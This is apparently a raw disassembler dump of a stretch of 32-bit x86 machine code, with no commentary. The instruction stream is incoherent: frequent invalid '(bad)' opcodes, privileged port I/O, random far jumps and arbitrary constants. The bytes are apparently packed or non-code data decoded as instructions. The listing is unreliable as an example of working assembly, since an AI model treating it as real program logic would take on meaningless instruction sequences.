  4202f1:	sbb    esi,DWORD PTR [eax]
  4202f3:	popa   
  4202f4:	fsubp  st(0),st
  4202f6:	sbb    BYTE PTR [eax-0x28],ch
  4202f9:	fwait
  4202fa:	(bad)  
  4202fb:	pop    eax
  4202fc:	pushf  
  4202fd:	cmp    ebx,ebx
  4202ff:	daa    
  420300:	jecxz  0x42037d
  420302:	rol    DWORD PTR [ebx],cl
  420304:	(bad)  
  420305:	jmp    0xc722:0xec92243c
  42030c:	mov    esp,0x77ce330c
  420311:	test   eax,0x1bfedea7
  420316:	(bad)  
  420317:	cld    
  420318:	in     eax,0xd6
  42031a:	(bad)  
  42031b:	cwde   
  42031c:	add    al,0x3d
  42031e:	mov    cl,0x3
  420320:	dec    ecx
  420321:	out    dx,eax
  420322:	in     al,dx
  420323:	lds    edi,FWORD PTR [edi-0x5759633e]
  420329:	ror    DWORD PTR ds:0x209b4296,cl
  42032f:	inc    ecx
  420330:	bound  esp,QWORD PTR [esp+edi*8+0x3]
  420334:	sahf   
  420335:	jp     0x420315
  420337:	mov    BYTE PTR [eax-0x33db0da0],ah
  42033d:	repnz push edi
  42033f:	jg     0x420360
  420341:	xor    eax,0x27e4a75c
  420346:	popa   
  420347:	xor    BYTE PTR [eax+0x26a2ab2c],cl
  42034d:	sbb    bh,ah
  42034f:	lea    ebp,[esi]
  420351:	xor    DWORD PTR [edi],edi
  420353:	xor    BYTE PTR cs:[esi-0x60],0x0
  420358:	ins    BYTE PTR es:[edi],dx
  420359:	pop    eax
  42035a:	xchg   DWORD PTR [ebx],eax
  42035c:	mov    dl,0x4f
  42035e:	jns    0x42032a
  420360:	push   esp
  420361:	rol    BYTE PTR [edx+0x3b],0x2e
  420365:	jmp    0xbdbe19ab
  42036a:	xor    BYTE PTR [esi+edx*4+0x45dec3f9],0x75
  420372:	push   cs
  420373:	mov    esi,eax
  420375:	inc    esp
  420376:	int3   
  420377:	cs loopne 0x420339
  42037a:	mul    BYTE PTR [esi-0x20]
  42037d:	sub    eax,0xf8832d97
  420382:	cmp    BYTE PTR [edi+0x31],bl
  420385:	inc    ebp
  420386:	dec    eax
  420387:	push   ebx
  420388:	aad    0xca
  42038a:	cmp    al,0xd5
  42038c:	push   ebp
  42038d:	(bad)  
  42038e:	adc    DWORD PTR [esi+edi*4],esp
  420391:	push   eax
  420392:	in     al,0x6f
  420394:	ds xchg edi,eax
  420396:	xchg   esi,eax
  420397:	rcl    DWORD PTR [ecx-0x49a711a4],1
  42039d:	jns    0x4203aa
  42039f:	sub    DWORD PTR [edx+0x6a2acd4f],ebp
  4203a5:	rcl    dh,cl
  4203a7:	pop    edi
  4203a8:	mov    BYTE PTR [edx-0x2d2bcf5d],ah
  4203ae:	hlt    
  4203af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203b0:	xchg   bh,ah
  4203b2:	mov    edx,0x57e64972
  4203b7:	call   0x3f68:0xf16b07fd
  4203be:	cdq    
  4203bf:	imul   dl
  4203c1:	mov    edx,0x2a89e8b7
  4203c6:	xor    al,0x1d
  4203c8:	fimul  DWORD PTR [edx+0x39d36f14]
  4203ce:	dec    ebp
  4203cf:	std    
  4203d0:	aam    0x96
  4203d2:	sbb    eax,0xb20fc1c7
  4203d7:	out    dx,al
  4203d8:	outs   dx,BYTE PTR ds:[esi]
  4203d9:	or     BYTE PTR [ecx+0x1e],ch
  4203dc:	cmp    al,0xa9
  4203de:	sub    BYTE PTR ds:0xd526f36d,bl
  4203e4:	jg     0x4203da
  4203e6:	dec    esp
  4203e7:	dec    ebp
  4203e8:	push   ebx
  4203e9:	mov    ds:0x43e1c0cf,eax
  4203ee:	mov    ds:0x2e493478,eax
  4203f3:	loop   0x42046a
  4203f5:	and    al,BYTE PTR [eax+0x69]
  4203f8:	fimul  DWORD PTR [edi-0x7c]
  4203fb:	dec    ecx
  4203fc:	sub    esp,DWORD PTR [ebx]
  4203fe:	cmp    DWORD PTR [esi+ebp*2],edi
  420401:	das    
  420402:	xor    dh,BYTE PTR [ebx-0xc]
  420405:	xchg   DWORD PTR gs:[eax],esp
  420408:	xchg   edx,eax
  420409:	les    eax,FWORD PTR [edx]
  42040b:	adc    DWORD PTR [esi+0x16c1c920],edx
  420411:	fucomi st,st(6)
  420413:	push   ebp
  420414:	test   al,cl
  420416:	inc    edi
  420417:	daa    
  420418:	loope  0x4203e4
  42041a:	mov    bl,0x69
  42041c:	out    dx,eax
  42041d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42041e:	push   cs
  42041f:	(bad)  
  420420:	loopne 0x420443
  420422:	xor    DWORD PTR [edx],0xffffffa9
  420425:	cli    
  420426:	iret   
  420427:	pusha  
  420428:	loope  0x4204a2
  42042a:	fidivr WORD PTR [edx-0x68e4b783]
  420430:	sbb    edx,0x882cf981
  420436:	test   eax,0x91fe2b4c
  42043b:	ror    BYTE PTR [eax-0x61],cl
  42043e:	add    dl,0xb0
  420441:	mov    ds:0x9ad8c0ac,eax
  420446:	les    esi,FWORD PTR [ebx-0x3efe96c9]
  42044c:	aam    0x8b
  42044e:	pushf  
  42044f:	dec    esp
  420450:	in     eax,dx
  420451:	push   esp
  420452:	xchg   esi,eax
  420453:	std    
  420454:	fcmovnbe st,st(1)
  420456:	push   edi
  420457:	adc    cl,al
  420459:	and    BYTE PTR [edi],0x92
  42045c:	sbb    bh,BYTE PTR [eax]
  42045e:	mov    ch,0xd6
  420460:	bound  esi,QWORD PTR [edx+0x1ab562c]
  420466:	ret    
  420467:	xor    al,0xad
  420469:	(bad)  
  42046b:	es sbb esi,esi
  42046e:	mov    cl,0xb4
  420470:	stos   BYTE PTR es:[edi],al
  420471:	(bad)  
  420472:	jl     0x42040c
  420474:	push   edi
  420475:	xor    eax,0xd69e97bf
  42047a:	cdq    
  42047b:	jo     0x420442
  42047d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42047e:	sbb    esp,esi
  420480:	sti    
  420481:	sub    al,0xbc
  420483:	sahf   
  420484:	inc    ebp
  420485:	push   cs
  420486:	enter  0xf6ce,0xb8
  42048a:	ja     0x4204c5
  42048c:	daa    
  42048d:	and    ch,bh
  42048f:	sahf   
  420490:	jp     0x420489
  420492:	test   al,0x30
  420494:	enter  0x5b91,0x2a
  420498:	and    BYTE PTR [ecx+0x10],ch
  42049b:	mov    cl,0xc5
  42049d:	push   cs
  42049e:	mov    ch,0x23
  4204a0:	shl    BYTE PTR [ecx+eiz*2+0x412b14a],1
  4204a7:	xor    ebp,esi
  4204a9:	ds test eax,0x17acd291
  4204af:	lea    esi,[edx-0x7f]
  4204b2:	add    eax,0xf06e67f5
  4204b7:	repz mov ah,cl
  4204ba:	xlat   BYTE PTR ds:[ebx]
  4204bb:	call   0x3f12:0x7d34411f
  4204c2:	repz push ecx
  4204c4:	(bad)  
  4204c6:	sbb    al,0xce
  4204c8:	ret    0xaf26
  4204cb:	mov    ah,BYTE PTR [eax-0x19f4869d]
  4204d1:	dec    ebp
  4204d2:	out    0xf3,eax
  4204d4:	sbb    BYTE PTR [eax-0x68c9fb05],bl
  4204da:	cmp    dh,BYTE PTR [ebx]
  4204dc:	add    ecx,DWORD PTR [eax-0x33]
  4204df:	aaa    
  4204e0:	lea    edi,[eax+0x132aeedc]
  4204e6:	pop    edi
  4204e7:	into   
  4204e8:	loop   0x4204ab
  4204ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204eb:	rcl    DWORD PTR [ecx-0x7938b9e5],1
  4204f1:	mov    edi,?
  4204f3:	dec    ebp
  4204f4:	dec    edx
  4204f5:	mov    eax,0x7a7be595
  4204fa:	pushf  
  4204fb:	cld    
  4204fc:	add    ecx,ebp
  4204fe:	lods   eax,DWORD PTR ds:[esi]
  4204ff:	nop
  420500:	xor    eax,0x5b6270be
  420505:	shr    BYTE PTR [ecx+0x5391e334],cl
  42050b:	fwait
  42050c:	ins    BYTE PTR es:[edi],dx
  42050d:	int    0xee
  42050f:	sub    ecx,DWORD PTR [edi-0x4a3064ab]
  420515:	cmp    ch,BYTE PTR [ebx+edx*2]
  420518:	test   BYTE PTR [eax],dh
  42051a:	sbb    esp,edi
  42051c:	popa   
  42051d:	out    dx,al
  42051e:	lods   al,BYTE PTR ds:[esi]
  42051f:	mov    ah,0x26
  420521:	push   es
  420522:	pop    ebx
  420523:	(bad)  es:[edi]
  420526:	mov    esp,0xd3072a7d
  42052b:	pop    esi
  42052c:	dec    esp
  42052d:	scas   al,BYTE PTR es:[edi]
  42052e:	inc    esp
  42052f:	outs   dx,DWORD PTR ds:[esi]
  420530:	xchg   ebx,eax
  420531:	loope  0x4204fe
  420533:	pop    ecx
  420534:	fist   WORD PTR [esi-0x335448d0]
  42053a:	jmp    edi
  42053c:	xor    edi,ecx
  42053e:	sahf   
  42053f:	push   ds
  420540:	cdq    
  420541:	cld    
  420542:	jmp    0xb106:0x19002ad1
  420549:	(bad)  
  42054a:	jge    0x4205c9
  42054c:	repnz (bad) 
  42054f:	test   DWORD PTR [ebx*4-0x6cbd8cbe],edi
  420556:	dec    esi
  420557:	aas    
  420558:	out    0xdd,al
  42055a:	lea    ecx,[edx-0x330e3c1d]
  420560:	out    0xb2,al
  420562:	lods   eax,DWORD PTR ds:[esi]
  420563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420564:	stc    
  420565:	outs   dx,BYTE PTR ds:[esi]
  420566:	adc    esi,DWORD PTR [edi+0x28]
  420569:	push   eax
  42056a:	adc    edi,edx
  42056c:	sub    DWORD PTR [ecx],0xffffff8b
  42056f:	popf   
  420570:	pxor   mm4,QWORD PTR [ebx-0x1]
  420574:	or     al,0x14
  420576:	or     esi,edx
  420578:	jle    0x42059e
  42057a:	ja     0x42051b
  42057c:	loope  0x420569
  42057e:	outs   dx,BYTE PTR ds:[esi]
  42057f:	lds    esi,FWORD PTR [edi]
  420581:	add    al,0x59
  420583:	out    dx,eax
  420584:	or     BYTE PTR [eax],0xaf
  420587:	jne    0x4205d4
  420589:	leave  
  42058a:	pop    eax
  42058b:	xor    DWORD PTR [eax+0x63],eax
  42058e:	jmp    0xeebe:0x12a02c46
  420595:	sub    bh,ah
  420597:	mov    ch,0xd9
  420599:	mov    esp,0xef7bf9b3
  42059e:	jns    0x42053b
  4205a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205a1:	outs   dx,DWORD PTR ds:[esi]
  4205a2:	data16 (bad) 
  4205a4:	xchg   edx,eax
  4205a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205a6:	cli    
  4205a7:	retf   0x72d5
  4205aa:	das    
  4205ab:	inc    ebx
  4205ac:	xor    ch,BYTE PTR [edx]
  4205ae:	mov    edx,0x2ea8423c
  4205b3:	nop
  4205b4:	popw   ss
  4205b6:	dec    ecx
  4205b7:	pop    ss
  4205b8:	out    0xdd,eax
  4205ba:	dec    esi
  4205bb:	sbb    DWORD PTR [edi],esp
  4205bd:	mov    ch,BYTE PTR [esi]
  4205bf:	or     eax,eax
  4205c1:	out    0x8a,al
  4205c3:	jbe    0x420574
  4205c5:	mov    bh,0x4a
  4205c7:	sub    esi,DWORD PTR [edi-0x47967d7a]
  4205cd:	cwde   
  4205ce:	add    al,0x43
  4205d0:	adc    DWORD PTR [ebx+0x54],ebx
  4205d3:	shl    ah,cl
  4205d5:	sbb    BYTE PTR [edx-0x27],0xc2
  4205d9:	mov    edx,0x5b3ff8ac
  4205de:	in     eax,dx
  4205df:	push   es
  4205e0:	adc    al,0x32
  4205e2:	pop    DWORD PTR [ebx+0x435d6193]
  4205e8:	mov    WORD PTR [ecx],fs
  4205ea:	sbb    al,dh
  4205ec:	xchg   esp,eax
  4205ed:	jno    0x420626
  4205ef:	mov    DWORD PTR [ecx],esp
  4205f1:	test   DWORD PTR [ebx+ebx*1-0x23],esp
  4205f5:	or     DWORD PTR [ebx-0x44],edx
  4205f8:	or     DWORD PTR ss:[edi+ecx*4+0x28c88fe0],esp
  420600:	pusha  
  420601:	or     BYTE PTR [ecx+0x28003e3f],bh
  420607:	jp     0x420613
  420609:	in     eax,0xc8
  42060b:	das    
  42060c:	in     eax,0xff
  42060e:	ficom  DWORD PTR [edi]
  420610:	cmp    ebp,DWORD PTR [esi]
  420612:	and    BYTE PTR [ebp+0xf],al
  420615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420616:	cld    
  420617:	out    0x25,eax
  420619:	fwait
  42061a:	sbb    DWORD PTR [eax+0x150ac5d],0xffffffe5
  420621:	pop    edx
  420622:	call   0xb810:0x1c82612d
  420629:	sahf   
  42062a:	jns    0x420654
  42062c:	pop    ds
  42062d:	outs   dx,DWORD PTR ds:[esi]
  42062e:	mov    ecx,edi
  420630:	xchg   ebx,eax
  420631:	das    
  420632:	scas   eax,DWORD PTR es:[edi]
  420633:	inc    ecx
  420634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420635:	lahf   
  420636:	jbe    0x420664
  420638:	add    al,0xef
  42063a:	repnz add al,0xca
  42063d:	(bad)  
  42063e:	pop    ss
  42063f:	retf   
  420640:	pushf  
  420641:	(bad)  
  420642:	mov    ebx,0x857c9890
  420647:	cmp    eax,0x7f65689e
  42064c:	imul   edi,DWORD PTR [edx+0x43],0xa49b6d4b
  420653:	xchg   ecx,eax
  420654:	cmp    bh,BYTE PTR [edi+0x8]
  420657:	mov    cl,0xad
  420659:	and    edx,DWORD PTR [edi+0x78e46496]
  42065f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420660:	leave  
  420661:	pop    ebp
  420662:	icebp  
  420663:	outs   dx,BYTE PTR ds:[esi]
  420665:	into   
  420666:	dec    esp
  420667:	lds    eax,FWORD PTR [eax-0x5e1b643b]
  42066d:	outs   dx,BYTE PTR ds:[esi]
  42066e:	mov    bh,0x9e
  420670:	out    0x4f,eax
  420672:	and    eax,0x5e5e3bdd
  420677:	mov    ds,WORD PTR [edx+0x6619f46e]
  42067d:	je     0x42068b
  42067f:	cmc    
  420680:	neg    BYTE PTR [edi]
  420682:	push   cs
  420683:	div    edx
  420685:	add    BYTE PTR [edi],0xef
  420688:	pop    ebp
  420689:	or     DWORD PTR ds:0xb730fcd0,eax
  42068f:	pop    edi
  420690:	mov    ebp,0x6118e42a
  420695:	sbb    al,0x7f
  420697:	adc    al,0xc7
  420699:	push   0xaac363d4
  42069e:	cwde   
  42069f:	jnp    0x420631
  4206a1:	data16 out 0xcd,al
  4206a4:	mov    ebx,0x2ef19c48
  4206a9:	jp     0x42066e
  4206ab:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206ad:	stos   DWORD PTR es:[edi],eax
  4206ae:	jg     0x4206fa
  4206b0:	jno    0x42069b
  4206b2:	fs je  0x42064a
  4206b5:	int    0xb5
  4206b7:	dec    esi
  4206b8:	push   edx
  4206b9:	ret    
  4206ba:	bswap  eax
  4206bc:	fistp  WORD PTR [edx+0x5a68caa]
  4206c2:	adc    dl,ah
  4206c4:	cmp    al,0x34
  4206c6:	(bad)  
  4206c7:	xlat   BYTE PTR ds:[ebx]
  4206c8:	and    al,0x83
  4206ca:	rol    BYTE PTR [ebp-0x3368d9da],0x91
  4206d1:	loope  0x420667
  4206d3:	(bad)  
  4206d4:	ss in  al,dx
  4206d6:	mov    esi,0x22fa2ad6
  4206db:	out    dx,al
  4206dc:	jne    0x4206d4
  4206de:	push   esp
  4206df:	adc    eax,0x51861d03
  4206e4:	bswap  esi
  4206e6:	jb     0x42074c
  4206e8:	outs   dx,DWORD PTR ds:[esi]
  4206e9:	mov    bh,BYTE PTR [edi]
  4206eb:	lahf   
  4206ec:	into   
  4206ed:	lea    ebp,[esi-0x50a2ef28]
  4206f3:	call   0xea84:0xb8d8f38e
  4206fa:	loopne 0x420750
  4206fc:	mov    edi,0x87ae4717
  420701:	sti    
  420702:	jmp    0x420780
  420704:	int3   
  420705:	cwde   
  420706:	shr    DWORD PTR [eax+0x3e],0xc1
  42070a:	dec    esi
  42070b:	dec    eax
  42070c:	xchg   edi,eax
  42070d:	test   DWORD PTR [ecx+0x61],0x9f139ffc
  420714:	cli    
  420715:	push   edi
  420716:	push   ecx
  420717:	xor    eax,eax
  420719:	stc    
  42071a:	mov    dh,0xce
  42071c:	pop    ds
  42071d:	lds    esi,FWORD PTR [ecx+0x3f]
  420720:	cmp    bh,ch
  420722:	gs mov ebp,edi
  420725:	pop    eax
  420726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420727:	push   esi
  420728:	pop    esp
  420729:	mov    dh,bh
  42072b:	push   ebx
  42072c:	sub    eax,0xcdc61fe9
  420731:	leave  
  420732:	fsub   QWORD PTR [edx+0x21]
  420735:	out    0x41,eax
  420737:	inc    ebp
  420738:	inc    edx
  420739:	inc    esp
  42073a:	inc    edi
  42073b:	xchg   BYTE PTR [eax],dh
  42073d:	sbb    eax,DWORD PTR [edx+0xae13b52]
  420743:	leave  
  420744:	and    bh,BYTE PTR [edi+0x4f]
  420747:	pop    edi
  420748:	mov    bh,0x8
  42074a:	pop    es
  42074b:	mov    eax,0x60d6103d
  420750:	dec    esp
  420751:	pop    ecx
  420752:	mov    edx,0x5eb62868
  420757:	outs   dx,DWORD PTR ds:[esi]
  420758:	fchs   
  42075a:	aad    0x74
  42075c:	adc    BYTE PTR [esi],cl
  42075e:	and    BYTE PTR [ebx],0xc
  420761:	xor    BYTE PTR [ecx],0x1d
  420764:	lahf   
  420765:	scas   eax,DWORD PTR es:[edi]
  420766:	mov    BYTE PTR [eax+0x62],dl
  420769:	mov    ecx,ebx
  42076b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42076c:	mov    dh,0x6f
  42076e:	push   ecx
  42076f:	hlt    
  420770:	push   ebp
  420771:	push   cs
  420772:	mov    dh,0x8f
  420774:	sti    
  420775:	sbb    ebx,esp
  420777:	mov    ah,0xe3
  420779:	xor    dh,BYTE PTR [esi+0x6e]
  42077c:	aam    0x8a
  42077e:	jno    0x420775
  420780:	or     al,0xdf
  420782:	and    DWORD PTR [edi],edi
  420784:	adc    al,0x2c
  420786:	jne    0x420777
  420788:	add    cl,BYTE PTR [ebp+0x66348154]
  42078e:	jae    0x42071d
  420790:	shr    BYTE PTR [ecx-0x49],cl
  420793:	pop    ecx
  420794:	inc    esi
  420795:	and    eax,0x2eee19ad
  42079a:	retf   
  42079b:	jmp    0xbed3f97c
  4207a0:	inc    esi
  4207a1:	push   edx
  4207a2:	inc    ecx
  4207a3:	fcomip st,st(5)
  4207a5:	xlat   BYTE PTR ds:[ebx]
  4207a6:	xlat   BYTE PTR ds:[ebx]
  4207a7:	mov    eax,ds:0x38e5d1aa
  4207ac:	popa   
  4207ad:	sub    ecx,DWORD PTR [ecx-0x70]
  4207b0:	imul   BYTE PTR [ebp+0xa353988]
  4207b6:	cmp    edi,0xb533622b
  4207bc:	mov    ah,0x40
  4207be:	fcomp  DWORD PTR [esi-0x3a7c768e]
  4207c4:	inc    eax
  4207c5:	inc    esp
  4207c6:	daa    
  4207c7:	dec    eax
  4207c8:	push   esi
  4207c9:	xor    al,0xbb
  4207cb:	pop    esi
  4207cc:	push   ss
  4207cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207ce:	(bad)  [esi]
  4207d0:	pushf  
  4207d1:	push   eax
  4207d2:	jae    0x4207fc
  4207d4:	retf   
  4207d5:	aam    0x67
  4207d7:	cmp    BYTE PTR [esi+edx*1],ch
  4207da:	out    0xa,eax
  4207dc:	mov    dh,0x33
  4207de:	cmp    BYTE PTR [edx],cl
  4207e0:	fcomp  QWORD PTR [esi+0xa032966]
  4207e6:	sbb    al,0xd8
  4207e8:	repz pop edx
  4207ea:	add    ecx,ebp
  4207ec:	jae    0x42084f
  4207ee:	mov    ds:0xf5104d00,al
  4207f3:	cmp    bh,BYTE PTR [bp+si-0x2d5d]
  4207f8:	into   
  4207f9:	jne    0x420863
  4207fb:	shl    BYTE PTR [ebp-0x3f],cl
  4207fe:	xor    BYTE PTR [ecx-0x7],bh
  420801:	test   DWORD PTR [edx],0x49e57455
  420807:	cmp    esp,ebx
  420809:	add    al,0x9f
  42080b:	test   DWORD PTR [eax],esi
  42080d:	mov    ebp,0xaef413a6
  420812:	fst    QWORD PTR [ebx-0x3580f84]
  420818:	cmp    al,0xf1
  42081a:	add    eax,0xb6214e55
  42081f:	mov    ecx,0x30819a98
  420824:	dec    esi
  420825:	sub    BYTE PTR [ebx],0xcc
  420828:	mov    dh,0x4b
  42082a:	je     0x4207b8
  42082c:	cmp    BYTE PTR [ecx+edx*4-0x31],dh
  420830:	in     eax,0xe7
  420832:	xor    edx,DWORD PTR [ebx]
  420834:	pop    ss
  420835:	rol    BYTE PTR [esp+esi*4-0x2c49257f],1
  42083c:	and    BYTE PTR [edx],al
  42083e:	mov    ecx,0x5296671a
  420843:	popa   
  420844:	mov    BYTE PTR [ebp+0x2c5313db],dl
  42084a:	adc    dh,bl
  42084c:	out    dx,eax
  42084d:	fist   DWORD PTR [ecx]
  42084f:	jb     0x420844
  420851:	cld    
  420852:	sti    
  420853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420854:	sbb    ebp,DWORD PTR [ebx]
  420856:	dec    ebp
  420857:	sbb    DWORD PTR [esi-0x668844f0],ecx
  42085d:	popa   
  42085e:	mov    dl,0x21
  420860:	test   BYTE PTR [ebp-0x3be3f5ea],dh
  420866:	add    bl,ch
  420868:	(bad)  
  420869:	pushf  
  42086a:	loopne 0x420817
  42086c:	dec    eax
  42086d:	cld    
  42086e:	push   edi
  42086f:	mov    dl,0xb8
  420871:	int    0x16
  420873:	sbb    dh,0x36
  420876:	jmp    0x3ef9:0x369dd19f
  42087d:	clc    
  42087e:	xchg   ebx,eax
  42087f:	loop   0x42081b
  420881:	int    0xf6
  420883:	fwait
  420884:	xlat   BYTE PTR ds:[ebx]
  420885:	push   ecx
  420886:	lods   eax,DWORD PTR ds:[esi]
  420887:	pop    ss
  420888:	pop    esi
  420889:	sbb    eax,ecx
  42088b:	(bad)  
  42088c:	aad    0x40
  42088e:	add    edx,DWORD PTR [esi-0x10]
  420891:	push   ds
  420892:	test   DWORD PTR [ebx+ecx*2+0x77],0xa46e1716
  42089a:	int3   
  42089b:	in     al,dx
  42089c:	sbb    bh,BYTE PTR [edi-0x4f4182cb]
  4208a2:	ja     0x42083d
  4208a4:	dec    esi
  4208a5:	dec    ecx
  4208a6:	icebp  
  4208a7:	and    BYTE PTR [eax-0x22],cl
  4208aa:	xchg   esi,eax
  4208ab:	xchg   edi,eax
  4208ac:	loop   0x420915
  4208ae:	fcom   DWORD PTR [esi+0x2d]
  4208b1:	popf   
  4208b2:	dec    edi
  4208b3:	popa   
  4208b4:	xlat   BYTE PTR ds:[ebx]
  4208b5:	das    
  4208b6:	mov    ecx,0x9e56f5e6
  4208bb:	or     bh,BYTE PTR [ecx-0x2c]
  4208be:	je     0x420920
  4208c0:	sbb    eax,edi
  4208c2:	dec    ecx
  4208c3:	mov    ebx,0xc57628ae
  4208c8:	sbb    BYTE PTR [ecx-0x3915716a],0x3e
  4208cf:	loop   0x4208fd
  4208d1:	in     eax,0xa2
  4208d3:	fstp   QWORD PTR [edx+0x66]
  4208d6:	mov    cl,0x59
  4208d8:	mov    eax,ds:0x7ee8890f
  4208dd:	retf   0xc97
  4208e0:	inc    esi
  4208e1:	cmp    BYTE PTR ds:0x37d300cb,ch
  4208e7:	push   esi
  4208e8:	xchg   BYTE PTR [edx],ah
  4208ea:	icebp  
  4208eb:	icebp  
  4208ec:	add    eax,0x746f624
  4208f1:	xor    al,bl
  4208f3:	cmp    eax,0x78614dac
  4208f8:	xor    al,BYTE PTR [edi-0x57]
  4208fb:	js     0x420901
  4208fd:	xchg   DWORD PTR [edi-0x73],ecx
  420900:	jg     0x420908
  420902:	jo     0x4208b2
  420904:	inc    ecx
  420905:	out    dx,al
  420906:	adc    eax,0x496f8795
  42090b:	aam    0x1b
  42090d:	pop    eax
  42090e:	mov    dl,0x55
  420910:	jmp    0x8d7f:0x4b84c75f
  420917:	mov    BYTE PTR [edx],dl
  420919:	sbb    BYTE PTR [ebx-0x719177a4],bh
  42091f:	add    DWORD PTR [esi-0x5760d886],0x37
  420926:	xor    DWORD PTR [ecx-0x2],esp
  420929:	pusha  
  42092a:	cmp    cl,ah
  42092c:	push   0x7993c30d
  420931:	ret    0xfdb2
  420934:	ret    
  420935:	mov    al,ds:0xf0adc309
  42093a:	sbb    eax,0xb4332508
  42093f:	jl     0x420987
  420941:	push   ebp
  420942:	sub    bl,0xcf
  420945:	je     0x420948
  420947:	ds loope 0x42092e
  42094a:	cmp    DWORD PTR [edx+esi*1-0x455fd909],ebp
  420951:	bound  esi,QWORD PTR [esi]
  420953:	pop    eax
  420954:	iret   
  420955:	ret    
  420956:	pcmpeqw mm0,mm0
  420959:	xchg   ecx,eax
  42095a:	jno    0x42093a
  42095c:	adc    BYTE PTR ds:0xb697000b,bh
  420962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420963:	pop    ebp
  420964:	(bad)  
  420965:	push   eax
  420966:	add    al,0xf7
  420968:	repz lds edx,FWORD PTR [edi]
  42096b:	mov    ch,0x9e
  42096d:	xor    BYTE PTR [edx],0x92
  420970:	fucomip st,st(5)
  420972:	xchg   edi,eax
  420973:	adc    edi,esp
  420975:	fldcw  WORD PTR [ecx+0x33]
  420978:	das    
  420979:	pop    edi
  42097a:	in     al,0x24
  42097c:	pop    eax
  42097d:	fsin   
  42097f:	lahf   
  420980:	fbstp  TBYTE PTR [esp+esi*8+0x7c]
  420984:	xor    BYTE PTR [edx-0x7c],cl
  420987:	mov    ds:0x55207c6a,al
  42098c:	pop    es
  42098d:	mov    fs,eax
  42098f:	retf   0xc9ae
  420992:	cld    
  420993:	adc    ch,BYTE PTR [ecx+0x314eb3b5]
  420999:	push   cs
  42099a:	dec    edi
  42099b:	push   cs
  42099c:	push   cs
  42099d:	add    eax,0x7e049cd9
  4209a2:	xor    ebp,edi
  4209a4:	add    ah,dh
  4209a6:	mov    ch,0x7a
  4209a8:	icebp  
  4209a9:	mov    esp,0x88a94cdc
  4209ae:	sub    eax,0xadeb3a69
  4209b3:	(bad)  
  4209b5:	jl     0x420950
  4209b7:	sbb    esp,DWORD PTR [ebp+0x78]
  4209ba:	fcomp  QWORD PTR [edi-0xc4c8f1e]
  4209c0:	jle    0x4209f2
  4209c2:	dec    ebp
  4209c3:	inc    eax
  4209c4:	es hlt 
  4209c6:	inc    esp
  4209c7:	dec    ecx
  4209c8:	mov    ds:0xc455473f,al
  4209cd:	ret    
  4209ce:	mov    dl,0x24
  4209d0:	inc    ebp
  4209d1:	mov    ebp,0xfaefeab2
  4209d6:	ficom  WORD PTR [edi]
  4209d8:	outs   dx,DWORD PTR ds:[esi]
  4209d9:	cmp    ebp,ebp
  4209db:	leave  
  4209dc:	jmp    0x94e7b99
  4209e1:	jo     0x4209a6
  4209e3:	and    cl,BYTE PTR [ecx]
  4209e5:	pop    eax
  4209e6:	cli    
  4209e7:	add    ah,ch
  4209e9:	push   edi
  4209ea:	sahf   
  4209eb:	jmp    0xf9eb:0xed7717ca
  4209f2:	cmp    ch,BYTE PTR [ebx-0x27]
  4209f5:	in     al,dx
  4209f6:	test   BYTE PTR [eax+0x5a88fe8b],cl
  4209fc:	push   esi
  4209fd:	mov    es,WORD PTR [ecx+edi*4-0x7e]
  420a01:	ds stc 
  420a03:	mov    ch,0xc5
  420a05:	inc    ebx
  420a06:	sub    eax,0xc5ddd5a1
  420a0b:	dec    ecx
  420a0c:	test   DWORD PTR [edi+0x47eebb97],esp
  420a12:	lahf   
  420a13:	sidtd  [ebx+0x51]
  420a17:	pop    edi
  420a18:	add    DWORD PTR [esi],ebp
  420a1a:	es aam 0x67
  420a1d:	mov    al,ds:0xe87fb7ae
  420a22:	mov    ds:0x6e8123b9,al
  420a27:	dec    edx
  420a28:	js     0x420a69
  420a2a:	nop
  420a2b:	js     0x4209d1
  420a2d:	inc    edi
  420a2e:	cmp    DWORD PTR [ebx-0x5922d3a8],eax
  420a34:	xor    DWORD PTR fs:[eax-0x5f047386],esi
  420a3b:	data16 fist WORD PTR [eax+0x21a8a5b6]
  420a42:	xchg   edx,eax
  420a43:	or     BYTE PTR [ebx+0x3c],dh
  420a46:	or     esi,DWORD PTR [ebx+0x3bfddf54]
  420a4c:	fcom   QWORD PTR [eax]
  420a4e:	sub    bh,ch
  420a50:	imul   esi,DWORD PTR [esp+esi*2-0x2a],0xdf1aa5d3
  420a58:	sahf   
  420a59:	mov    al,ds:0x4846c444
  420a5e:	int    0x73
  420a60:	sbb    eax,0x8ecebd99
  420a65:	data16 (bad) 
  420a67:	stc    
  420a68:	loopne 0x420a91
  420a6a:	pop    esi
  420a6b:	dec    edi
  420a6c:	lds    ebp,FWORD PTR [edi+edx*1]
  420a6f:	inc    ebp
  420a70:	and    ecx,edi
  420a72:	inc    BYTE PTR [ebx]
  420a74:	call   0xce74:0x9701af32
  420a7b:	mov    al,0xb1
  420a7d:	mov    cs,WORD PTR [ecx-0x4e]
  420a80:	dec    esi
  420a81:	xchg   edi,eax
  420a82:	into   
  420a83:	xchg   ebx,eax
  420a84:	mov    WORD PTR [ebp+ebx*2-0xf],gs
  420a88:	pop    esp
  420a89:	ins    BYTE PTR es:[edi],dx
  420a8a:	es jle 0x420b02
  420a8d:	push   es
  420a8e:	cli    
  420a8f:	fwait
  420a90:	jnp    0x420adb
  420a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a93:	pushf  
  420a94:	xchg   esp,eax
  420a95:	and    DWORD PTR [edi],esp
  420a97:	push   edi
  420a98:	dec    ebx
